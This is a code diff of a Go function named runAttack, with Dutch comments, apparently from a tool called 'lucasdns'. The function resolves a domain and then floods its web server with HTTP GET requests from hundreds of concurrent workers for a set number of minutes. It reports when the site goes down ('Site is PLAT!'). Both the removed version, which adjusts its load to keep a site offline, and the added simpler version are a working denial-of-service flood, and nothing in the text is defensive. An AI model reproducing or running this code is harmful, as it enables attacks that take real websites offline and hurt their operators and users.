@@ -675,10 +675,6 @@ func fetchSubdomainsCT(ctx context.Context, domain string) ([]string, error) {
 }
 
 func runAttack(ctx context.Context, client *dns.Client, resolver, domain string, minutes int) error {
-	// Maak nieuwe context zonder timeout voor de aanval
-	attackCtx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-	
 	// Eerst DNS lookup om IPs te krijgen
 	fmt.Printf("🔍 DNS lookup voor %s...\n", domain)
 	a, err := queryType(ctx, client, resolver, domain, dns.TypeA)
@@ -701,13 +697,11 @@ func runAttack(ctx context.Context, client *dns.Client, resolver, domain string,
 	
 	var targetURL string
 	httpClient := &http.Client{
-		Timeout: 3 * time.Second, // Kortere timeout voor snellere detectie
+		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
-			MaxIdleConns:        10000,
-			MaxIdleConnsPerHost: 10000,
-			MaxConnsPerHost:     10000,
+			MaxIdleConns:        1000,
+			MaxIdleConnsPerHost: 1000,
 			IdleConnTimeout:     90 * time.Second,
-			DisableKeepAlives:   false,
 		},
 	}
 	
@@ -731,105 +725,84 @@ func runAttack(ctx context.Context, client *dns.Client, resolver, domain string,
 	
 	fmt.Printf("🎯 Target: %s\n", targetURL)
 	fmt.Printf("⏱️  Duur: %d minuten\n", minutes)
-	fmt.Printf("🚀 Starten MASSALE aanval...\n\n")
+	fmt.Printf("🚀 Starten aanval...\n\n")
 	
 	duration := time.Duration(minutes) * time.Minute
 	deadline := time.Now().Add(duration)
 	
-	// Stats (atomic voor thread-safety)
+	// Stats
 	var totalRequests int64
 	var successRequests int64
 	var failedRequests int64
-	var siteDown int32 // atomic bool
+	var siteDown bool
 	var siteDownSince time.Time
 	var mu sync.Mutex
 	
-	// Dynamische load: veel workers als site up is, minder als site down is
-	maxWorkers := 1000  // HEEL VEEL workers
-	minWorkers := 200   // Minimum om site down te houden
-	currentWorkers := maxWorkers
-	
-	// Request channel - veel groter buffer
-	requestChan := make(chan struct{}, 50000)
+	// Worker pool voor requests - VEEL workers
+	workers := 500
+	requestChan := make(chan struct{}, workers*20)
 	
 	// Start workers
 	var wg sync.WaitGroup
-	startWorkers := func(count int) {
-		for i := 0; i < count; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for {
-					select {
-					case <-attackCtx.Done():
-						return
-					case _, ok := <-requestChan:
-						if !ok {
-							return
-						}
-						
-						req, _ := http.NewRequest("GET", targetURL, nil)
-						req.Header.Set("User-Agent", "lucasdns/"+version)
-						req.Header.Set("Connection", "keep-alive")
-						
-						resp, err := httpClient.Do(req)
-						
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for range requestChan {
+				req, _ := http.NewRequest("GET", targetURL, nil)
+				req.Header.Set("User-Agent", "lucasdns/"+version)
+				req.Header.Set("Connection", "keep-alive")
+				
+				resp, err := httpClient.Do(req)
+				
+				mu.Lock()
+				isDown := siteDown
+				mu.Unlock()
+				
+				if err != nil {
+					// Timeout of connection refused = site is down
+					if !isDown {
 						mu.Lock()
-						isDown := atomic.LoadInt32(&siteDown) == 1
-						mu.Unlock()
-						
-						if err != nil {
-							// Timeout of connection refused = site is down
-							if !isDown {
-								mu.Lock()
-								if atomic.CompareAndSwapInt32(&siteDown, 0, 1) {
-									siteDownSince = time.Now()
-									fmt.Printf("\n💥 Site is PLAT! Timer start...\n")
-								}
-								mu.Unlock()
-							}
-							atomic.AddInt64(&failedRequests, 1)
-						} else {
-							statusOK := resp.StatusCode < 500 && resp.StatusCode >= 200
-							resp.Body.Close()
-							
-							if !statusOK {
-								// Server error = site is down
-								if !isDown {
-									mu.Lock()
-									if atomic.CompareAndSwapInt32(&siteDown, 0, 1) {
-										siteDownSince = time.Now()
-										fmt.Printf("\n💥 Site is PLAT! (status %d) Timer start...\n", resp.StatusCode)
-									}
-									mu.Unlock()
-								}
-								atomic.AddInt64(&failedRequests, 1)
-							} else {
-								// Site is weer online
-								if isDown {
-									mu.Lock()
-									if atomic.CompareAndSwapInt32(&siteDown, 1, 0) {
-										downDuration := time.Since(siteDownSince)
-										fmt.Printf("\n✅ Site is weer ONLINE (was %v plat) - VERHOGEN LOAD!\n", downDuration.Round(time.Second))
-									}
-									mu.Unlock()
-								}
-								atomic.AddInt64(&successRequests, 1)
-							}
+						if !siteDown {
+							siteDown = true
+							siteDownSince = time.Now()
+							fmt.Printf("\n💥 Site is PLAT! Timer start...\n")
 						}
-						atomic.AddInt64(&totalRequests, 1)
+						mu.Unlock()
+					}
+					atomic.AddInt64(&failedRequests, 1)
+				} else {
+					resp.Body.Close()
+					if resp.StatusCode >= 500 {
+						// Server error = site is down
+						if !isDown {
+							mu.Lock()
+							if !siteDown {
+								siteDown = true
+								siteDownSince = time.Now()
+								fmt.Printf("\n💥 Site is PLAT! (status %d) Timer start...\n", resp.StatusCode)
+							}
+							mu.Unlock()
+						}
+						atomic.AddInt64(&failedRequests, 1)
+					} else {
+						// Site is weer online
+						if isDown {
+							mu.Lock()
+							if siteDown {
+								downDuration := time.Since(siteDownSince)
+								fmt.Printf("\n✅ Site is weer ONLINE (was %v plat)\n", downDuration.Round(time.Second))
+								siteDown = false
+							}
+							mu.Unlock()
+						}
+						atomic.AddInt64(&successRequests, 1)
 					}
 				}
-			}()
-		}
+				atomic.AddInt64(&totalRequests, 1)
+			}
+		}()
 	}
-	
-	// Start initiële workers
-	startWorkers(currentWorkers)
-	
-	// Dynamische load aanpassing
-	loadAdjustTicker := time.NewTicker(2 * time.Second)
-	defer loadAdjustTicker.Stop()
 	
 	// Status updates
 	statusTicker := time.NewTicker(3 * time.Second)
@@ -837,74 +810,46 @@ func runAttack(ctx context.Context, client *dns.Client, resolver, domain string,
 	
 	startTime := time.Now()
 	
-	// Send requests - AGRESSIEF
+	// Send requests - veel tegelijk
 	go func() {
 		for time.Now().Before(deadline) {
 			select {
-			case <-attackCtx.Done():
-				return
+			case requestChan <- struct{}{}:
+				// Request sent
 			default:
-				// Stuur HEEL VEEL requests tegelijk
-				select {
-				case requestChan <- struct{}{}:
-					// Request sent
-				default:
-					// Channel vol, maar blijf proberen
-				}
+				// Channel full, wait a bit
+				time.Sleep(1 * time.Millisecond)
 			}
 		}
 		close(requestChan)
 	}()
 	
-	// Print status updates en pas load aan
+	// Print status updates
 	for time.Now().Before(deadline) {
 		select {
-		case <-loadAdjustTicker.C:
-			// Dynamische load aanpassing
-			isDown := atomic.LoadInt32(&siteDown) == 1
-			if isDown {
-				// Site is down - verminder load om rond hetzelfde niveau te houden
-				if currentWorkers > minWorkers {
-					currentWorkers = minWorkers
-				}
-			} else {
-				// Site is up - VERHOOG load om site snel plat te krijgen
-				if currentWorkers < maxWorkers {
-					currentWorkers = maxWorkers
-					// Start extra workers als nodig
-					if currentWorkers > 500 {
-						startWorkers(100) // Voeg meer workers toe
-					}
-				}
-			}
-			
 		case <-statusTicker.C:
 			remaining := time.Until(deadline).Round(time.Second)
 			elapsed := time.Since(startTime).Seconds()
 			reqPerSec := float64(atomic.LoadInt64(&totalRequests)) / elapsed
 			
-			isDown := atomic.LoadInt32(&siteDown) == 1
+			mu.Lock()
+			isDown := siteDown
 			var statusInfo string
 			if isDown {
-				mu.Lock()
 				downDuration := time.Since(siteDownSince).Round(time.Second)
-				mu.Unlock()
 				statusInfo = fmt.Sprintf("PLAT (%v)", downDuration)
 			} else {
 				statusInfo = "ONLINE"
 			}
+			mu.Unlock()
 			
-			fmt.Printf("Requests: %d | Success: %d | Failed: %d | %.0f req/s | Workers: %d | Status: %s | Tijd over: %v\n",
+			fmt.Printf("Requests: %d | Success: %d | Failed: %d | %.0f req/s | Status: %s | Tijd over: %v\n",
 				atomic.LoadInt64(&totalRequests), atomic.LoadInt64(&successRequests), 
-				atomic.LoadInt64(&failedRequests), reqPerSec, currentWorkers, statusInfo, remaining)
-				
-		case <-attackCtx.Done():
-			return attackCtx.Err()
+				atomic.LoadInt64(&failedRequests), reqPerSec, statusInfo, remaining)
 		}
 	}
 	
-	// Stop workers
-	cancel()
+	// Wacht tot alle workers klaar zijn
 	wg.Wait()
 	
 	fmt.Printf("\n\n")
@@ -913,14 +858,15 @@ func runAttack(ctx context.Context, client *dns.Client, resolver, domain string,
 	fmt.Printf("   Succesvol: %d\n", atomic.LoadInt64(&successRequests))
 	fmt.Printf("   Gefaald: %d\n", atomic.LoadInt64(&failedRequests))
 	
-	isDown := atomic.LoadInt32(&siteDown) == 1
+	mu.Lock()
+	isDown := siteDown
 	if isDown {
-		mu.Lock()
 		downDuration := time.Since(siteDownSince).Round(time.Second)
 		mu.Unlock()
 		fmt.Printf("   Status: 🔴 PLAT (sinds %v)\n", downDuration)
 		fmt.Printf("   ⚠️  Site ligt nog steeds plat!\n")
 	} else {
+		mu.Unlock()
 		fmt.Printf("   Status: 🟢 ONLINE\n")
 	}
 	
